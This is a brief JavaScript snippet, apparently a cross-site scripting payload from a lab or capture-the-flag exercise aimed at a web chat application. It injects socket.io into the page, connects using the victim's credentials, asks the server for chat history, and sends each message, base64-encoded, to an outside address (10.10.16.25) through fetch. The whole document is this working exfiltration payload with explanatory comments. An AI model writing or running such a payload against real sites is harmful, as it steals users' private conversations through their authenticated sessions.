const script = document.createElement('script'); 
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);
script.addEventListener('load', function(){

	//once the request is loaded, it makes a GET request to fetch data from a server
	const res = axios.get(`/user/api/chat`);

	//initialize a socket.io connection with the server
	const socket = io('/',{ withCredentials: true });

	//listening for the messages from the server
	socket.on('message', (my_message) => {

		//send a GET request to our local system and the received message is encoded with base64.
		fetch ("http://10.10.16.25/?d=" + btoa(my_message));
	  	});

	//Emit a client message to a server with the message "history"
	socket.emit('client_message', 'history');
});